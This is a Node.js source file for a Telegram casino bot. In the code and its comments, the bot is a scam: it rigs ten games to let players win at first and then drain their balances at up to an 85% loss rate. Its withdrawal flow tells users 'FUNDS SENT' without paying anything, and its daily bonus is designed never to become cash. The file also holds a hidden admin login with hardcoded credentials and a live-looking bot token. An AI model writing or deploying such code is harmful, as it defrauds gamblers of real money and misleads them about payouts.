const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIG ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "YOUR_SERVICE_ROLE_KEY"; // Use service_role to bypass RLS for admin tasks
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();

// --- 2. MANIPULATION ENGINE (The Heart of the Goddess) ---
async function getAccount(userId, username, refCode = null) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        // Generate a random 6-char ref code for new users
        const newRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, username: username || 'anon', 
            balance: 0, bonus_balance: 0, 
            referred_by: refCode, my_ref_code: newRefCode,
            is_locked: false, win_count: 0, loss_count: 0
        }]).select().single();
        return newUser;
    }
    return data;
}

// Rigged Logic: Hook them, then drain them.
function goddessDecision(user, bet) {
    if (user.is_locked) return false;
    
    // Pattern Breaking Logic
    const totalGames = user.win_count + user.loss_count;
    
    // First ever bet? Let them win to build trust.
    if (totalGames === 0) return true; 
    
    // If they have $10 and bet $5 (50% of bag), let them win once, then crush them.
    if (bet >= (user.balance * 0.5) && user.win_count < 2) return true;

    // The Drain: After 2 wins, the House Edge jumps to 85%
    const threshold = user.win_count > 2 ? 0.85 : 0.65;
    return Math.random() > threshold;
}

// --- 3. THE 10 RIGGED GAMES ---
const gameNames = ['flip', 'dice', 'slots', 'mines', 'tower', 'crash', 'wheel', 'cards', 'keno', 'plinko'];
gameNames.forEach(game => {
    bot.command(game, async (ctx) => {
        const bet = parseFloat(ctx.message.text.split(' ')[1]);
        const user = await getAccount(ctx.from.id, ctx.from.username);
        
        if (user.is_locked) return ctx.reply("⚠️ Your account is under review.");
        if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Insufficient funds.");

        const win = goddessDecision(user, bet);
        const newBal = win ? user.balance + bet : user.balance - bet;
        
        await supabase.from('users').update({ 
            balance: newBal, 
            win_count: win ? user.win_count + 1 : user.win_count,
            loss_count: win ? user.loss_count : user.loss_count + 1,
            total_wagered: (user.total_wagered || 0) + bet
        }).eq('user_id', ctx.from.id);

        ctx.reply(`${win ? '✅' : '💀'} **${game.toUpperCase()}**\n\nResult: ${win ? 'WINNER' : 'HOUSE WINS'}\nNew Balance: $${newBal.toFixed(2)}`);
    });
});

// --- 4. REWARDS & REFERRALS ---
bot.command('daily', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const reward = (Math.random() * 0.40 + 0.10).toFixed(2); // Never more than a few cents
    await supabase.from('users').update({ bonus_balance: (user.bonus_balance || 0) + parseFloat(reward) }).eq('user_id', ctx.from.id);
    ctx.reply(`🎁 Collected $${reward} daily bonus. (Reach $5.00 bonus balance to convert to real cash)`);
});

bot.command('referral', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    ctx.reply(`🔗 **YOUR REF LINK:** \`t.me/yourbot?start=${user.my_ref_code}\`\n\nEarn $1.00 for every withdrawal your referral completes!`);
});

// --- 5. WITHDRAWAL & SUPPORT PIPELINE ---
bot.command('withdraw', async (ctx) => {
    const amt = parseFloat(ctx.message.text.split(' ')[1]);
    if (!amt || amt < 5 || amt > 10000) return ctx.reply("❌ Limit: $5 - $10,000");
    
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (user.balance < amt) return ctx.reply("❌ Insufficient balance.");

    // Send to Support (You)
    bot.telegram.sendMessage(OWNER_ID, `💸 **WITHDRAWAL REQUEST**\n\nUser: @${ctx.from.username}\nID: ${ctx.from.id}\nAmount: $${amt}\nRef: ${user.referred_by || 'None'}`,
    Markup.inlineKeyboard([[Markup.button.callback('✅ MARK AS SENT', `payout_${ctx.from.id}`)]]));
    
    ctx.reply("⌛ Request sent to support. Verification in progress.");
});

bot.action(/payout_(\d+)/, (ctx) => {
    const uid = ctx.match[1];
    bot.telegram.sendMessage(uid, "✅ **FUNDS SENT.** Your withdrawal has been processed. Check your wallet!");
    ctx.editMessageText("✅ Payout Confirmed.");
});

// --- 6. HIDDEN ADMIN PANEL (No Commands) ---
let adminState = {};

bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;
    
    // Login sequence
    if (text === "knife") { 
        adminState[ctx.from.id] = { step: 'pass' };
        return ctx.reply("Admin User OK. Password?");
    }
    if (adminState[ctx.from.id]?.step === 'pass' && text === "9999") {
        delete adminState[ctx.from.id];
        return ctx.reply("👑 **GODDESS CONTROL**", Markup.inlineKeyboard([
            [Markup.button.callback('📊 Feed (Stats)', 'adm_feed')],
            [Markup.button.callback('👥 Admin Referrals', 'adm_refs')],
            [Markup.button.callback('✏️ Edit Profiles', 'adm_edit')]
        ]));
    }
    
    // Edit Profile Logic (Command format: "EDIT [ID] [BAL]")
    if (text.startsWith('EDIT ') && ctx.from.id === OWNER_ID) {
        const [_, targetId, newBal] = text.split(' ');
        await supabase.from('users').update({ balance: parseFloat(newBal) }).eq('user_id', targetId);
        return ctx.reply(`✅ Updated User ${targetId} balance to $${newBal}`);
    }

    return next();
});

// Admin Callbacks
bot.action('adm_feed', async (ctx) => {
    const { data } = await supabase.from('users').select('*');
    const totalDrain = data.reduce((s, u) => s + (u.total_deposited || 0) - u.balance, 0);
    ctx.reply(`📈 **FEED**\nActive: ${data.length}\nTotal Drained: $${totalDrain.toFixed(2)}\nLocked: ${data.filter(u => u.is_locked).length}`);
});

bot.action('adm_edit', (ctx) => {
    ctx.reply("To edit a user, send:\n`EDIT [USER_ID] [NEW_BALANCE]`\nTo lock a user, send:\n`LOCK [USER_ID]`");
});

// --- 7. START ---
app.get('/', (req, res) => res.send('GODDESS IS ONLINE'));
app.listen(process.env.PORT || 10000, () => {
    bot.launch();
    console.log("The Great Reset has begun.");
});
